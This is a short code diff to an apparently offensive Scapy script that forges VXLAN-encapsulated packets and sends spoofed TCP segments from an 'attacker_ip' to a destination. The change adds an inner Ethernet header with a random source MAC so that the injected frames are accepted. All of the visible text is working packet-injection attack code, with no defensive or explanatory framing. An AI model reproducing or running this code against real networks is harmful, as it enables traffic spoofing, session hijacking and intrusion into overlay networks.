@@ -38,7 +38,7 @@ Flags = {"FIN": 0x01,"SYN": 0x02,"RST": 0x04,"PSH": 0x08,"ACK": 0x10,"URG": 0x20
 spoof_vxlan = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")
 
 def send_spoofed_TCP(_seq, _ack, _flags):
-    send(spoof_vxlan / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=d_port, seq=_seq, ack=_ack, flags=_flags))
+    send(spoof_vxlan / Ether(dst=mac_dst,src=random_mac) / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=d_port, seq=_seq, ack=_ack, flags=_flags))
     return
 
 # send SYN Packet
